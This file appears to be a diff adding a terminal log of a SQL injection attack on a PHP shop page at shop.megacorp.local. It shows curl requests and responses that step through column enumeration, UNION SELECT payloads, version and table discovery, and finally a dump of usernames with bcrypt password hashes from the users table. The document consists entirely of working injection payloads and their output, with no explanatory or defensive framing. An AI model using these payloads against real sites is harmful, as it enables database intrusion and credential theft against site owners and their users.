@@ -1,0 +1,22 @@
+$ curl -s "http://shop.megacorp.local/product.php?id=7"
+<div class="product"><h2>Wireless Mouse</h2><span class="price">$24.99</span></div>
+
+$ curl -s "http://shop.megacorp.local/product.php?id=7 ORDER BY 5-- -"
+<b>Unknown column '5' in 'order clause'</b>
+
+$ curl -s "http://shop.megacorp.local/product.php?id=7 ORDER BY 4-- -"
+<div class="product"><h2>Wireless Mouse</h2><span class="price">$24.99</span></div>
+
+$ curl -s "http://shop.megacorp.local/product.php?id=-1 UNION SELECT 1,2,3,4-- -"
+<div class="product"><h2>2</h2><span class="price">$3</span></div>
+
+$ curl -s "http://shop.megacorp.local/product.php?id=-1 UNION SELECT 1,version(),database(),4-- -"
+<div class="product"><h2>10.6.16-MariaDB-0ubuntu0.22.04.1</h2><span class="price">$shopdb</span></div>
+
+$ curl -s "http://shop.megacorp.local/product.php?id=-1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -"
+<div class="product"><h2>carts,orders,products,users</h2><span class="price">$3</span></div>
+
+$ curl -s "http://shop.megacorp.local/product.php?id=-1 UNION SELECT 1,group_concat(username,0x3a,password SEPARATOR 0x0a),3,4 FROM users-- -"
+<div class="product"><h2>admin:$2y$10$Rz9Q1kJh2eN8pWl0uYcUdeK7mZ3sV.aB1cD2eF3gH4iJ5kL6mN7o
+jenna.okafor:$2y$10$8fT2rQvW1xY3zA4bC5dE6uF7gH8iJ9kL0mN1oP2qR3sT4uV5wX6y
+r.castillo:$2y$10$Kp0oI9uY8tR7eW6qA5sD4fG3hJ2kL1zX0cV9bN8mM7nQ6wE5rT4y</h2><span class="price">$3</span></div>
